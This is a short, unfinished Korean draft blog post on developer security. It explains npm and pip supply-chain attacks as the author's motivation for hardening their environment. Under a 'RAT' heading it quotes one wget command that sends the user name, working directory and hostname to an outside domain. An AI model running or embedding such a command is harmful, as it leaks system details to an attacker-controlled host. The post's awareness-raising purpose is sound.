---
title: '안전한 개발환경을 만들어보자'
authors: [arch-spatula]
tags: ['docker', '보안', 'npm']
description: '개발환경의 보안을 신경써봅시다.'
toc_max_heading_level: 6
draft: true
---

# 안전한 개발환경을 만들어보자

<!--truncate-->

## 배경

![](/img/2024-01-31/gilbert.jpeg)

> 인간이 잘하는 것이 하나 있다면 그것은 새로운 걱정을 찾는 것이다
>
> Gilbert(넷플릭스 샌드맨 ~~몇 화인지 모름~~)

취업하고 배가 따시하기 시작하니까 저는 이제 새로운 걱정이 생겼습니다. 보안입니다.

공부 혹은 취미로 코딩하는데 언제든지 멀웨어가 설치될 수 있습니다. github 돌아다니면서 재미있어 보이면 설치해봅니다. 그 과정에 언제든이 멀웨어가 설치될 수 있습니다.

<iframe class="codepen" src="https://www.youtube.com/embed/DjfpcmK62ew" title="지금! 🚨 개발자라면 무조건 알아야하는 NPM 해킹" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

더 정확히는 위 영상을 보면서 생겨난 의문들과 대응 방안들을 찾고자 이 글을 쓰기 시작했습니다. 또 npm에 docker 설정한다는 언제 알려줄지도 모릅니다. 마냥 기다리기는 싫어서 제가 다루고 싶어졌습니다.

## 보안 취약점

### 공급망 공격

> 공격자가 기업(개발자)의 소프트웨어 설치 및 업데이트 배포 과정에 침입해 정상 소프트웨어인 것처럼 꾸민 악성 소프트웨어를 사용자 기기에 설치하는 방식
>
> 보안뉴스

공급망 공격은 패키지 생태계가 있는 모든 프로그래밍 언어는 해당합니다. 표준 라이브러리가 아닌 설치가 필요한 시점부터 모두 취약점입니다. 저간 soydev는 npm, pip에 의존을 많이 하고 있는데 설치할 때마다 저의 기계가 탈취될 가능성을 만드는 것입니다.

어느정도 오픈소스 커뮤니티에서 알려진 라이브러리를 사용하면 피해규모를 줄일 수 있을 것이라고 많이 착각합니다. 피해자가 많으면 대응하려는 사람이 많으니까 비교적 안전할 것이고 PR에 보안문제를 만드는 것을 통과시킬 가능성은 낮겠죠? 우리는 안일합니다. 언제든지 첨보자산은 변절(Compromised)할 수 있습니다. 구글이 알리바바에게 매수당하고 백도어를 언제 만들지 모릅니다. ~~알루미늄 모자는 내려 놓고~~

RAT Remote Access Trojan

```sh
wget --quiet "https://curetosec.online/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"
```

<!-- [LLM 전두엽 제거수술](https://www.youtube.com/watch?v=GyllRd2E6fg&pp=ygUIZmlyZXNoaXA%3D)을 하려는데 AI 수술대 AWS를 위한 `.env` 정보가 털린다거나 하는 것은 흔합니다. -->

<!-- 바로 저의 보안 취약점입니다. 저는 언제 해킹당할지 모른다는 생각을 갖고 있습니다. 언제 저도 모르게 저의 컴퓨터에 키로거(key logger)가 설치 되어 있고 원격서버에 실시간으로 전송할지 모른다는 생각을 갖고 있습니다. 클립보드에 이상한 값이 들어오면 바로 swap할 것이라는 생각을 갖고 있습니다. 가끔 휴대폰을 확인하면서 어디서 로그인 시도가 발생했는지 걱정하고 있습니다. 극단적으로 MFA가 뚤렸다는 생각도 갖고 있습니다. -->

<!-- 하지만 모든 것들은 생각입니다. 지금 현재 갖고 있는 지식에서 이 보안을 하나둘씩 대응하기에는 지식이 부족합니다. -->
